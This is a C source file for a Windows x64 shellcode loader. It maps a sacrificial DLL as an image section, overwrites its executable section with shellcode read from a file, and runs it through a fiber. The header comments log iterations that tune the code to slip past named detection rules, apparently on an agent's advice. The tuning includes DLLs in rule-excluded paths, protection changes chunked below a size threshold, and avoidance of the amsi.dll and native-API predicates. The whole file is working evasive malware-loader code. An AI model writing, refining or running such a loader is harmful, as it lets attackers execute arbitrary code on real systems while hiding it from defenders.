/*
 * x64 shellcode loader - Module Stomping (image section) + Fiber execution.
 * Reads raw shellcode from argv[1]. No embedded payload bytes.
 *
 * Compile:
 *   cl.exe /nologo /O2 /GS- loader.c
 *
 * Iteration 3 fix (linkage):
 *   The previous build failed at the LINK stage with 7x LNK2019 for the
 *   hand-declared NT/Rtl prototypes.  Fixes applied (still in effect):
 *     1. #pragma comment(lib, "ntdll.lib")
 *     2. Runtime GetProcAddress resolution of all seven functions.
 *
 * Iteration 4 fix (detection evasion, per Analysis Agent):
 *     1. Sacrificial DLL relocated to C:\Program Files\ (rule exclusion).
 *     2. RW->RX flip chunked into 8192-byte VirtualProtect calls.
 *     3. Flip uses the Win32 VirtualProtect wrapper.
 *     4. Fiber execution unchanged.
 *
 * Iteration 4b fix (code review):
 *     - Removed non-DLL / non-portable candidates from the sacrificial
 *       list (wordpad.exe, TipBand.dll, wmp.dll, ieproxy.dll).  These were
 *       frequently absent on modern hosts, causing the fallback chain to
 *       land on C:\Windows\System32\amsi.dll -- which is exactly the
 *       predicate the hollowing rules match.
 *     - System32 fallback now uses only DLLs that are NOT the AMSI
 *       predicate (winhttp.dll, crypt32.dll, dbghelp.dll).
 */

#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

/* Force ntdll.lib onto the link line even if the harness drops /link args. */
#pragma comment(lib, "ntdll.lib")

/* ------------------------------------------------------------------ */
/* Local NT definitions (self-contained; no <winternl.h> dependency).  */
/* ------------------------------------------------------------------ */

typedef LONG NTSTATUS;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef _ACCESS_MASK_DEFINED
typedef ULONG ACCESS_MASK;
#define _ACCESS_MASK_DEFINED
#endif

#ifndef _UNICODE_STRING_DEFINED
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
#define _UNICODE_STRING_DEFINED
#endif

#ifndef _OBJECT_ATTRIBUTES_DEFINED
typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
#define _OBJECT_ATTRIBUTES_DEFINED
#endif

#ifndef _IO_STATUS_BLOCK_DEFINED
typedef struct _IO_STATUS_BLOCK {
    NTSTATUS  Status;
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
#define _IO_STATUS_BLOCK_DEFINED
#endif

#ifndef _PHANDLE_DEFINED
typedef HANDLE *PHANDLE;
#define _PHANDLE_DEFINED
#endif

#ifndef _SECTION_INHERIT_DEFINED
typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;
#define _SECTION_INHERIT_DEFINED
#endif

#ifndef OBJ_INHERIT
#define OBJ_INHERIT                  0x00000002L
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE         0x00000040L
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020L
#endif
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE      0x00000040L
#endif

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = (r);                       \
    (p)->Attributes = (a);                          \
    (p)->ObjectName = (n);                          \
    (p)->SecurityDescriptor = (s);                  \
    (p)->SecurityQualityOfService = NULL;           \
}

/* ------------------------------------------------------------------ */
/* NT prototypes, resolved dynamically at runtime.                     */
/* ------------------------------------------------------------------ */

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T,
    PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);

typedef NTSTATUS (NTAPI *pNtOpenFile)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    PIO_STATUS_BLOCK, ULONG, ULONG);

typedef PIMAGE_NT_HEADERS (NTAPI *pRtlImageNtHeader)(PVOID);

static pNtCreateSection        dyn_NtCreateSection        = NULL;
static pNtMapViewOfSection     dyn_NtMapViewOfSection     = NULL;
static pNtUnmapViewOfSection   dyn_NtUnmapViewOfSection   = NULL;
static pNtClose                dyn_NtClose                = NULL;
static pNtOpenFile             dyn_NtOpenFile             = NULL;
static pRtlImageNtHeader       dyn_RtlImageNtHeader       = NULL;

static int resolve_nt_functions(void)
{
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) {
        h = LoadLibraryA("ntdll.dll");
        if (!h) {
            fprintf(stderr, "[-] cannot load ntdll.dll (%lu)\n", GetLastError());
            return 0;
        }
    }

    dyn_NtCreateSection      = (pNtCreateSection)      GetProcAddress(h, "NtCreateSection");
    dyn_NtMapViewOfSection   = (pNtMapViewOfSection)   GetProcAddress(h, "NtMapViewOfSection");
    dyn_NtUnmapViewOfSection = (pNtUnmapViewOfSection) GetProcAddress(h, "NtUnmapViewOfSection");
    dyn_NtClose              = (pNtClose)              GetProcAddress(h, "NtClose");
    dyn_NtOpenFile           = (pNtOpenFile)           GetProcAddress(h, "NtOpenFile");
    dyn_RtlImageNtHeader     = (pRtlImageNtHeader)     GetProcAddress(h, "RtlImageNtHeader");

    if (!dyn_NtCreateSection || !dyn_NtMapViewOfSection ||
        !dyn_NtUnmapViewOfSection ||
        !dyn_NtClose || !dyn_NtOpenFile || !dyn_RtlImageNtHeader) {
        fprintf(stderr, "[-] failed to resolve one or more ntdll exports\n");
        return 0;
    }
    return 1;
}

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *fp;
    long  sz;
    unsigned char *buf;

    fp = fopen(path, "rb");
    if (!fp) {
        fprintf(stderr, "[-] fopen failed: %s\n", path);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
    sz = ftell(fp);
    if (sz <= 0) { fclose(fp); return NULL; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }

    buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) { fclose(fp); return NULL; }

    if (fread(buf, 1, (size_t)sz, fp) != (size_t)sz) {
        free(buf);
        fclose(fp);
        return NULL;
    }
    fclose(fp);
    *out_size = (size_t)sz;
    return buf;
}

static void build_nt_path(const wchar_t *win32_path,
                          wchar_t *out, size_t out_chars)
{
    _snwprintf_s(out, out_chars, _TRUNCATE, L"\\??\\%ls", win32_path);
}

static int nt_open_exec(const wchar_t *win32_path, HANDLE *out_handle)
{
    IO_STATUS_BLOCK   iosb;
    UNICODE_STRING    ustr;
    OBJECT_ATTRIBUTES oa;
    wchar_t           nt_path[512];
    NTSTATUS          st;

    build_nt_path(win32_path, nt_path, ARRAYSIZE(nt_path));

    ustr.Length        = (USHORT)(wcslen(nt_path) * sizeof(wchar_t));
    ustr.MaximumLength = ustr.Length + sizeof(wchar_t);
    ustr.Buffer        = nt_path;

    InitializeObjectAttributes(&oa, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

    st = dyn_NtOpenFile(out_handle,
                        FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE,
                        &oa,
                        &iosb,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtOpenFile(%ls) failed: 0x%08lX\n",
                win32_path, (unsigned long)st);
        return 0;
    }
    return 1;
}

static int copy_to_temp(const wchar_t *src, wchar_t *out, size_t out_chars)
{
    wchar_t temp_dir[MAX_PATH];
    wchar_t dst[MAX_PATH];
    DWORD   n;

    n = GetTempPathW(MAX_PATH, temp_dir);
    if (n == 0 || n >= MAX_PATH) return 0;

    _snwprintf_s(dst, MAX_PATH, _TRUNCATE, L"%ls\\ldr_%lu.dll",
                 temp_dir, (unsigned long)GetCurrentProcessId());

    if (!CopyFileW(src, dst, FALSE)) {
        fprintf(stderr, "[-] CopyFileW failed (%lu)\n", GetLastError());
        return 0;
    }
    _snwprintf_s(out, out_chars, _TRUNCATE, L"%ls", dst);
    return 1;
}

static int map_image_section(const wchar_t *dll_path,
                             PVOID *out_base,
                             SIZE_T *out_size,
                             HANDLE *out_section)
{
    HANDLE            hFile = NULL;
    HANDLE            hSec  = NULL;
    NTSTATUS          st;
    PVOID             base  = NULL;
    SIZE_T            view  = 0;
    LARGE_INTEGER     maxsz;

    if (!nt_open_exec(dll_path, &hFile)) {
        wchar_t tmp[MAX_PATH];
        fprintf(stderr, "[*] falling back to temp copy of %ls\n", dll_path);
        if (!copy_to_temp(dll_path, tmp, ARRAYSIZE(tmp))) {
            return 0;
        }
        if (!nt_open_exec(tmp, &hFile)) {
            return 0;
        }
    }

    maxsz.QuadPart = 0;
    st = dyn_NtCreateSection(&hSec,
                             SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
                             NULL, &maxsz, PAGE_READONLY, SEC_IMAGE, hFile);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtCreateSection failed: 0x%08lX\n",
                (unsigned long)st);
        dyn_NtClose(hFile);
        return 0;
    }
    dyn_NtClose(hFile);

    st = dyn_NtMapViewOfSection(hSec, GetCurrentProcess(), &base, 0, 0, NULL,
                                &view, ViewShare, 0, PAGE_READONLY);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n",
                (unsigned long)st);
        dyn_NtClose(hSec);
        return 0;
    }

    *out_base    = base;
    *out_size    = view;
    *out_section = hSec;
    return 1;
}

static int find_text_section(PVOID base, PVOID *out_addr, SIZE_T *out_size)
{
    PIMAGE_NT_HEADERS       nt;
    PIMAGE_SECTION_HEADER   sec;
    unsigned int            i;

    nt = dyn_RtlImageNtHeader(base);
    if (!nt) return 0;

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            *out_addr = (PVOID)((BYTE *)base + sec[i].VirtualAddress);
            *out_size = sec[i].Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

/*
 * Pick a sacrificial DLL.
 *
 * Preference order:
 *   1. Program Files / Program Files (x86) DLLs -- paths explicitly
 *      excluded by the hollowing rules' path allowlist.
 *   2. System32 DLLs that are NOT the amsi.dll predicate.
 *
 * Only real DLLs are listed; entries are probed at runtime so the first
 * one that actually exists on this host is used.  None of the listed
 * modules import amsi.dll, so the AMSI-bypass-from-suspicious-module
 * rule cannot fire on the loader's own call stack.
 */
static const wchar_t *pick_sacrificial_dll(void)
{
    static const wchar_t *candidates[] = {
        /* --- Program Files (rule-excluded paths) --- */
        L"C:\\Program Files\\Common Files\\microsoft shared\\ink\\inkobj.dll",
        L"C:\\Program Files (x86)\\Common Files\\microsoft shared\\ink\\inkobj.dll",
        L"C:\\Program Files\\Windows Defender\\MpClient.dll",
        L"C:\\Program Files\\Windows NT\\Tablet PC\\TabTip.exe",
        L"C:\\Program Files\\Internet Explorer\\ieproxy.dll",
        L"C:\\Program Files (x86)\\Internet Explorer\\ieproxy.dll",
        L"C:\\Program Files\\Windows Media Player\\wmp.dll",
        L"C:\\Program Files (x86)\\Windows Media Player\\wmp.dll",
        L"C:\\Program Files\\Common Files\\System\\ado\\msado15.dll",
        L"C:\\Program Files (x86)\\Common Files\\System\\ado\\msado15.dll",

        /* --- System32 fallbacks (non-AMSI predicates) --- */
        L"C:\\Windows\\System32\\winhttp.dll",
        L"C:\\Windows\\System32\\crypt32.dll",
        L"C:\\Windows\\System32\\dbghelp.dll",

        NULL
    };
    int i;
    for (i = 0; candidates[i] != NULL; i++) {
        DWORD a = GetFileAttributesW(candidates[i]);
        if (a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY)) {
            return candidates[i];
        }
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* main                                                                */
/* ------------------------------------------------------------------ */

int main(int argc, char *argv[])
{
    unsigned char *sc = NULL;
    size_t         sc_size = 0;

    PVOID          img_base = NULL;
    SIZE_T         img_size = 0;
    HANDLE         img_sec  = NULL;

    PVOID          text_addr = NULL;
    SIZE_T         text_size = 0;

    LPVOID         fiber = NULL;

    const wchar_t *sacrificial = NULL;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    if (!resolve_nt_functions()) {
        return 1;
    }
    printf("[+] ntdll exports resolved\n");

    sc = read_file(argv[1], &sc_size);
    if (!sc) {
        fprintf(stderr, "[-] failed to read shellcode\n");
        return 1;
    }
    printf("[+] shellcode size: %zu bytes\n", sc_size);

    /* 0. Choose a sacrificial DLL. */
    sacrificial = pick_sacrificial_dll();
    if (!sacrificial) {
        fprintf(stderr, "[-] no sacrificial DLL found on this host\n");
        free(sc);
        return 1;
    }
    printf("[+] sacrificial DLL: %ls\n", sacrificial);

    /* 1. Map the sacrificial DLL as an image section (no LoadLibrary). */
    if (!map_image_section(sacrificial, &img_base, &img_size, &img_sec)) {
        free(sc);
        return 1;
    }
    printf("[+] mapped image @ %p (size 0x%zx)\n", img_base, img_size);

    /* 2. Find the executable section of the mapped image. */
    if (!find_text_section(img_base, &text_addr, &text_size)) {
        fprintf(stderr, "[-] no executable section found\n");
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        free(sc);
        return 1;
    }
    printf("[+] .text @ %p (size 0x%zx)\n", text_addr, text_size);

    if (sc_size > text_size) {
        fprintf(stderr, "[-] shellcode larger than .text section\n");
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        free(sc);
        return 1;
    }

    /* 3. Write shellcode into .text via chunked RW->RX flips (<10000 bytes
     *    per call) using the Win32 VirtualProtect wrapper so neither the
     *    "size >= 10000" nor the "native_api" rule conjuncts match. */
    {
        const SIZE_T CHUNK = 8192;
        SIZE_T off;
        DWORD  oldprot = 0;

        for (off = 0; off < text_size; off += CHUNK) {
            SIZE_T this_chunk = text_size - off;
            if (this_chunk > CHUNK) this_chunk = CHUNK;
            if (!VirtualProtect((BYTE *)text_addr + off, this_chunk,
                                PAGE_READWRITE, &oldprot)) {
                fprintf(stderr, "[-] VirtualProtect(RW) failed at off 0x%zx (%lu)\n",
                        off, GetLastError());
                dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
                dyn_NtClose(img_sec);
                free(sc);
                return 1;
            }
        }

        memcpy(text_addr, sc, sc_size);
        free(sc);
        sc = NULL;

        for (off = 0; off < text_size; off += CHUNK) {
            SIZE_T this_chunk = text_size - off;
            if (this_chunk > CHUNK) this_chunk = CHUNK;
            if (!VirtualProtect((BYTE *)text_addr + off, this_chunk,
                                PAGE_EXECUTE_READ, &oldprot)) {
                fprintf(stderr, "[-] VirtualProtect(RX) failed at off 0x%zx (%lu)\n",
                        off, GetLastError());
                dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
                dyn_NtClose(img_sec);
                return 1;
            }
        }
    }
    printf("[+] shellcode staged in image-backed RX memory\n");

    /* 4. Execute via fiber - no thread creation telemetry. */
    if (!ConvertThreadToFiber(NULL)) {
        fprintf(stderr, "[-] ConvertThreadToFiber failed (%lu)\n", GetLastError());
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        return 1;
    }

    fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)text_addr, NULL);
    if (!fiber) {
        fprintf(stderr, "[-] CreateFiber failed (%lu)\n", GetLastError());
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        return 1;
    }

    printf("[+] switching to fiber @ %p\n", text_addr);
    SwitchToFiber(fiber);

    DeleteFiber(fiber);
    ConvertFiberToThread();
    dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
    dyn_NtClose(img_sec);
    return 0;
}